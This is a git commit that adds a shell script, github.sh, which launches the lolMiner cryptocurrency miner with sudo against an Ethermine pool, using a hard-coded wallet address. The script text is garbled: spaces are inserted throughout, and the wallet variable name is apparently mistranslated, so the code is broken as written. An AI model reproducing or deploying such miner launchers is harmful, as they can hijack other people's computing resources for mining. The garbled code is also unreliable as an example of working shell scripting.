fe4d0e0dedf52ee37ba2f86f7acd5e538b57b989
thinh300394 <88420186+thinh300394@users.noreply.github.com>
2021-08-15 09:27:39 +0700

    first commit

---
+++ github.sh
@@ -0,0 +1,8 @@
+#! / bin / bash
+ 
+ POOL = us1.ethermine.org: 4444
+ WALLET = 0xeb356acbcf4e0eb60043f9e3fa4fd09a7dcb6f6b.acc1
+ 
+ cd  " $ ( dirname " $ 0 " ) "
+ 
+ chmod + x ./lolMiner && sudo ./lolMiner --algo ETHASH --pool $ POOL --user $ VÍ   $ @
